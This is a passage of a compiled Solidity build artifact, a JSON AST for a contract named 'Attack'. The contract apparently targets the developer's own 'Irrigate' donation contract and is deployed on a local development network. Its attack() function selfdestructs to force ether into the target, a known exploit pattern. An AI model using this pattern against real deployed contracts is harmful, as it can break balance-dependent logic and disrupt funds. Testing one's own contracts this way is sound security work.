      "ReentrancyGuard": [
        1112
      ]
    },
    "id": 38,
    "license": "MIT",
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1,
        "literals": [
          "solidity",
          "^",
          "0.8",
          ".4"
        ],
        "nodeType": "PragmaDirective",
        "src": "33:23:0"
      },
      {
        "absolutePath": "/C/Users/rapha/Documents/IT/irrigate-server-erc20-donation/contracts/Irrigate.sol",
        "file": "./Irrigate.sol",
        "id": 2,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 38,
        "sourceUnit": 871,
        "src": "60:24:0",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "abstract": false,
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "contract",
        "fullyImplemented": true,
        "id": 37,
        "linearizedBaseContracts": [
          37
        ],
        "name": "Attack",
        "nameLocation": "97:6:0",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "id": 5,
            "mutability": "mutable",
            "name": "irrigate",
            "nameLocation": "120:8:0",
            "nodeType": "VariableDeclaration",
            "scope": 37,
            "src": "111:17:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_Irrigate_$870",
              "typeString": "contract Irrigate"
            },
            "typeName": {
              "id": 4,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 3,
                "name": "Irrigate",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 870,
                "src": "111:8:0"
              },
              "referencedDeclaration": 870,
              "src": "111:8:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_Irrigate_$870",
                "typeString": "contract Irrigate"
              }
            },
            "visibility": "internal"
          },
          {
            "body": {
              "id": 17,
              "nodeType": "Block",
              "src": "169:49:0",
              "statements": [
                {
                  "expression": {
                    "id": 15,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 11,
                      "name": "irrigate",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 5,
                      "src": "180:8:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Irrigate_$870",
                        "typeString": "contract Irrigate"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 13,
                          "name": "_irrigate",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 8,
                          "src": "200:9:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_Irrigate_$870",
                            "typeString": "contract Irrigate"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_contract$_Irrigate_$870",
                            "typeString": "contract Irrigate"
                          }
                        ],
                        "id": 12,
                        "name": "Irrigate",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 870,
                        "src": "191:8:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_Irrigate_$870_$",
                          "typeString": "type(contract Irrigate)"
                        }
                      },
                      "id": 14,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "191:19:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Irrigate_$870",
                        "typeString": "contract Irrigate"
                      }
                    },
                    "src": "180:30:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_Irrigate_$870",
                      "typeString": "contract Irrigate"
                    }
                  },
                  "id": 16,
                  "nodeType": "ExpressionStatement",
                  "src": "180:30:0"
                }
              ]
            },
            "id": 18,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 9,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 8,
                  "mutability": "mutable",
                  "name": "_irrigate",
                  "nameLocation": "158:9:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 18,
                  "src": "149:18:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_contract$_Irrigate_$870",
                    "typeString": "contract Irrigate"
                  },
                  "typeName": {
                    "id": 7,
                    "nodeType": "UserDefinedTypeName",
                    "pathNode": {
                      "id": 6,
                      "name": "Irrigate",
                      "nodeType": "IdentifierPath",
                      "referencedDeclaration": 870,
                      "src": "149:8:0"
                    },
                    "referencedDeclaration": 870,
                    "src": "149:8:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_Irrigate_$870",
                      "typeString": "contract Irrigate"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "148:20:0"
            },
            "returnParameters": {
              "id": 10,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "169:0:0"
            },
            "scope": 37,
            "src": "137:81:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 35,
              "nodeType": "Block",
              "src": "259:242:0",
              "statements": [
                {
                  "assignments": [
                    22
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 22,
                      "mutability": "mutable",
                      "name": "addr",
                      "nameLocation": "431:4:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 35,
                      "src": "415:20:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address_payable",
                        "typeString": "address payable"
                      },
                      "typeName": {
                        "id": 21,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "415:15:0",
                        "stateMutability": "payable",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 30,
                  "initialValue": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 27,
                            "name": "irrigate",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 5,
                            "src": "454:8:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Irrigate_$870",
                              "typeString": "contract Irrigate"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_Irrigate_$870",
                              "typeString": "contract Irrigate"
                            }
                          ],
                          "id": 26,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "446:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 25,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "446:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 28,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "446:17:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      ],
                      "id": 24,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "lValueRequested": false,
                      "nodeType": "ElementaryTypeNameExpression",
                      "src": "438:8:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_type$_t_address_payable_$",
                        "typeString": "type(address payable)"
                      },
                      "typeName": {
                        "id": 23,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "438:8:0",
                        "stateMutability": "payable",
                        "typeDescriptions": {}
                      }
                    },
                    "id": 29,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "typeConversion",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "438:26:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_address_payable",
                      "typeString": "address payable"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "415:49:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 32,
                        "name": "addr",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 22,
                        "src": "488:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 31,
                      "name": "selfdestruct",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 4294967275,
                      "src": "475:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
                        "typeString": "function (address payable)"
                      }
                    },
                    "id": 33,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "475:18:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 34,
                  "nodeType": "ExpressionStatement",
                  "src": "475:18:0"
                }
              ]
            },
            "functionSelector": "9e5faafc",
            "id": 36,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "attack",
            "nameLocation": "235:6:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 19,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "241:2:0"
            },
            "returnParameters": {
              "id": 20,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "259:0:0"
            },
            "scope": 37,
            "src": "226:275:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "public"
          }
        ],
        "scope": 38,
        "src": "88:416:0",
        "usedErrors": []
      }
    ],
    "src": "33:471:0"
  },
  "compiler": {
    "name": "solc",
    "version": "0.8.4+commit.c7e474f2.Emscripten.clang"
  },
  "networks": {
    "5777": {
      "events": {},
      "links": {},
      "address": "0xF09B1E965bBE9DAbEf39A3c492595e50ae010d2C",
      "transactionHash": "0xb092861c9c0f8823c758a7c843b24d673e26e2c1a2ed9df7d5f64a4978aa97f0"
    }
  },
  "schemaVersion": "3.4.0",
  "updatedAt": "2021-05-07T13:25:03.916Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}